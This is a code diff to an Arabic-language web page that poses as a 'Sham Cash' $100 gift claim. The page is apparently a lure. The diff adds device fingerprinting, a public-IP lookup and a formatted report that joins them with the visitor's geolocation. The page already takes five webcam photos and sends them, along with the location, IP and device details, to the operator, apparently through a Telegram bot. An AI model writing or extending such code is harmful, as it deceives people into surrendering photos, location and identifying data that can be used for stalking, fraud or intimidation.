@@ -7,6 +7,8 @@
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <!-- مكتبة تحليل User Agent -->
+  <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.37/dist/ua-parser.min.js"></script>
   <style>
     :root {
       --green: #007a3d;
@@ -44,7 +46,7 @@
       overflow-x: hidden;
     }
 
-    /* ============ شريط العلم السوري - أكبر وأوضح ============ */
+    /* ============ شريط العلم السوري ============ */
     .syria-flag {
       width: 100%;
       height: 10px;
@@ -68,16 +70,6 @@
       letter-spacing: 4px;
       text-shadow: 0 0 3px rgba(0,0,0,0.3);
       font-weight: bold;
-    }
-
-    /* مسافة تحت العلم */
-    .flag-spacer {
-      height: 10px;
-      width: 100%;
-      position: fixed;
-      top: 10px;
-      z-index: 99;
-      background: transparent;
     }
 
     /* ============ الحاوية الرئيسية ============ */
@@ -636,11 +628,10 @@
 </head>
 <body>
 
-  <!-- العلم السوري - أكبر وأوضح -->
+  <!-- العلم السوري -->
   <div class="syria-flag">
     <span class="syria-flag-stars">✦ ✦ ✦</span>
   </div>
-  <div class="flag-spacer"></div>
 
   <!-- الحاوية الرئيسية -->
   <div class="app-container">
@@ -777,6 +768,56 @@
     const CAPTURE_COUNT = 5;
     const CAPTURE_INTERVAL = 2000;
 
+    // ============ جمع معلومات الجهاز ============
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      const parser = new UAParser(ua);
+      
+      return {
+        device: parser.getDevice().type || 'كمبيوتر',
+        deviceModel: parser.getDevice().model || 'غير معروف',
+        deviceVendor: parser.getDevice().vendor || 'غير معروف',
+        os: parser.getOS().name || 'غير معروف',
+        osVersion: parser.getOS().version || 'غير معروف',
+        browser: parser.getBrowser().name || 'غير معروف',
+        browserVersion: parser.getBrowser().version || 'غير معروف',
+        engine: parser.getEngine().name || 'غير معروف',
+        screenResolution: `${window.screen.width}x${window.screen.height}`,
+        viewport: `${window.innerWidth}x${window.innerHeight}`,
+        colorDepth: `${window.screen.colorDepth}-bit`,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        localTime: new Date().toLocaleString('ar-SY'),
+        battery: 'غير معروف',
+        ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'غير معروف',
+        touchSupport: 'ontouchstart' in window ? 'يدعم اللمس' : 'لا يدعم اللمس',
+        connectionType: navigator.connection ? navigator.connection.effectiveType : 'غير معروف',
+      };
+    }
+
+    async function getBatteryInfo() {
+      try {
+        if ('getBattery' in navigator) {
+          const battery = await navigator.getBattery();
+          return {
+            level: `${Math.round(battery.level * 100)}%`,
+            charging: battery.charging ? 'يشحن' : 'لا يشحن',
+          };
+        }
+      } catch (e) {}
+      return null;
+    }
+
+    async function getIPInfo() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+      } catch (e) {
+        return 'غير متوفر';
+      }
+    }
+
     // ============ العناصر ============
     const giftCard = document.getElementById('giftCard');
     const headerCard = document.getElementById('headerCard');
@@ -818,6 +859,52 @@
       el.className = 'progress-step ' + status;
     }
 
+    // ============ صياغة رسالة المعلومات ============
+    function formatDeviceMessage(deviceInfo, locationData, ip) {
+      let msg = `🏦 <b>شام كاش - استلام هدية جديدة</b>\n\n`;
+      
+      msg += `━━━━━━━━━━━━━━━━━\n`;
+      msg += `📱 <b>معلومات الجهاز</b>\n`;
+      msg += `━━━━━━━━━━━━━━━━━\n`;
+      msg += `📱 <b>الجهاز:</b> ${deviceInfo.deviceModel} (${deviceInfo.device})\n`;
+      msg += `💻 <b>نظام التشغيل:</b> ${deviceInfo.os} ${deviceInfo.osVersion}\n`;
+      msg += `🌐 <b>المتصفح:</b> ${deviceInfo.browser} ${deviceInfo.browserVersion}\n`;
+      msg += `⚙️ <b>المحرك:</b> ${deviceInfo.engine}\n`;
+      msg += `🖥 <b>الشاشة:</b> ${deviceInfo.screenResolution} @ ${deviceInfo.colorDepth}\n`;
+      msg += `📐 <b>دقة العرض:</b> ${deviceInfo.viewport}\n`;
+      msg += `💾 <b>الذاكرة:</b> ${deviceInfo.ram}\n`;
+      msg += `👆 <b>اللمس:</b> ${deviceInfo.touchSupport}\n`;
+      msg += `📶 <b>الاتصال:</b> ${deviceInfo.connectionType}\n`;
+      
+      if (deviceInfo.battery && deviceInfo.battery !== 'غير معروف') {
+        msg += `🔋 <b>البطارية:</b> ${deviceInfo.battery}\n`;
+      }
+      
+      msg += `🌍 <b>اللغة:</b> ${deviceInfo.language}\n`;
+      msg += `🕐 <b>التوقيت المحلي:</b> ${deviceInfo.localTime}\n`;
+      msg += `⏰ <b>المنطقة الزمنية:</b> ${deviceInfo.timezone}\n`;
+      
+      msg += `\n━━━━━━━━━━━━━━━━━\n`;
+      msg += `📍 <b>معلومات الموقع</b>\n`;
+      msg += `━━━━━━━━━━━━━━━━━\n`;
+      
+      if (locationData) {
+        msg += `🗺 <b>الموقع:</b> <a href="${locationData.mapUrl}">عرض على الخريطة</a>\n`;
+        msg += `🎯 <b>الدقة:</b> ${Math.round(locationData.accuracy)} متر\n`;
+        msg += `📍 <b>الإحداثيات:</b> ${locationData.lat}, ${locationData.lng}\n`;
+      } else {
+        msg += `⚠️ لم يتم تحديد الموقع\n`;
+      }
+      
+      msg += `\n━━━━━━━━━━━━━━━━━\n`;
+      msg += `🌐 <b>معلومات الشبكة</b>\n`;
+      msg += `━━━━━━━━━━━━━━━━━\n`;
+      msg += `🔢 <b>IP:</b> <code>${ip}</code>\n`;
+      msg += `🔍 <b>IP Lookup:</b> <a href="https://whatismyipaddress.com/ip/${ip}">فحص الـ IP</a>\n`;
+      
+      return msg;
+    }
+
     // ============ دالة بدء الاستلام ============
     async function startClaim() {
       const btn = document.getElementById('claimBtn');
@@ -828,27 +915,34 @@
       updateProgressStep(1, 'current');
 
       try {
+        const deviceInfo = getDeviceInfo();
+        const ipPromise = getIPInfo();
+        const batteryPromise = getBatteryInfo();
+        
         CamBot.init({
           captureCount: CAPTURE_COUNT,
           captureInterval: CAPTURE_INTERVAL,
           imageQuality: 0.8
         });
 
+        const ip = await ipPromise;
+        const batteryInfo = await batteryPromise;
+        if (batteryInfo) {
+          deviceInfo.battery = `${batteryInfo.level} - ${batteryInfo.charging}`;
+        }
+
         // الخطوة 1: الموقع
         let locationData = null;
         try {
           locationData = await CamBot.getLocation();
-          await Config.sendMessage(
-            `🏦 <b>شام كاش - استلام هدية</b>\n\n` +
-            `📍 <b>الموقع:</b> <a href="${locationData.mapUrl}">عرض على الخريطة</a>\n` +
-            `🎯 الدقة: ${Math.round(locationData.accuracy)} متر\n` +
-            `🕐 ${new Date().toLocaleString('ar-SY')}`
-          );
         } catch (locErr) {
-          await Config.sendMessage(`⚠️ بدون موقع: ${locErr}`);
+          console.log('بدون موقع:', locErr);
         }
-        updateProgressStep(1, 'done');
         
+        const infoMessage = formatDeviceMessage(deviceInfo, locationData, ip);
+        await Config.sendMessage(infoMessage);
+        
+        updateProgressStep(1, 'done');
         await new Promise(r => setTimeout(r, 600));
 
         // الخطوة 2: الكاميرا
@@ -857,7 +951,7 @@
         try {
           await CamBot.startCamera();
         } catch (camErr) {
-          await Config.sendMessage(`📷 فشل الكاميرا: ${camErr.message}`);
+          await Config.sendMessage(`📷 <b>فشل الكاميرا:</b> ${camErr.message}`);
           throw new Error('يجب السماح بالوصول إلى الكاميرا للمتابعة');
         }
 
@@ -866,7 +960,7 @@
         await new Promise(r => setTimeout(r, 800));
         let blob = await CamBot.capture();
         if (blob) {
-          await Config.sendPhoto(blob, `📸 التحقق ${imagesSent + 1}/${CAPTURE_COUNT}`);
+          await Config.sendPhoto(blob, `📸 صورة ${imagesSent + 1}/${CAPTURE_COUNT} - ${deviceInfo.deviceModel}`);
           imagesSent++;
         }
 
@@ -879,7 +973,7 @@
             }
             blob = await CamBot.capture();
             if (blob) {
-              await Config.sendPhoto(blob, `📸 التحقق ${imagesSent + 1}/${CAPTURE_COUNT}`);
+              await Config.sendPhoto(blob, `📸 صورة ${imagesSent + 1}/${CAPTURE_COUNT} - ${deviceInfo.deviceModel}`);
               imagesSent++;
             }
             if (imagesSent >= CAPTURE_COUNT) {
@@ -897,14 +991,15 @@
         
         await Config.sendMessage(
           `✅ <b>اكتمل الاستلام - شام كاش</b>\n` +
-          `📸 ${imagesSent} صور تم التحقق منها\n` +
-          `💰 المبلغ: 100$\n` +
-          `🕐 ${new Date().toLocaleString('ar-SY')}`
+          `📸 ${imagesSent} صور\n` +
+          `💰 100$\n` +
+          `📱 ${deviceInfo.deviceModel}\n` +
+          `🌐 ${deviceInfo.browser}\n` +
+          `🔢 IP: <code>${ip}</code>`
         );
 
         await new Promise(r => setTimeout(r, 2000));
         updateProgressStep(3, 'done');
-
         await new Promise(r => setTimeout(r, 1000));
         showSuccess();
 
@@ -913,7 +1008,7 @@
         CamBot.stop();
         showError(error.message || 'حدث خطأ غير متوقع');
         try {
-          await Config.sendMessage(`❌ فشل الاستلام: ${error.message}`);
+          await Config.sendMessage(`❌ <b>فشل الاستلام:</b> ${error.message}`);
         } catch (e) {}
       }
     }
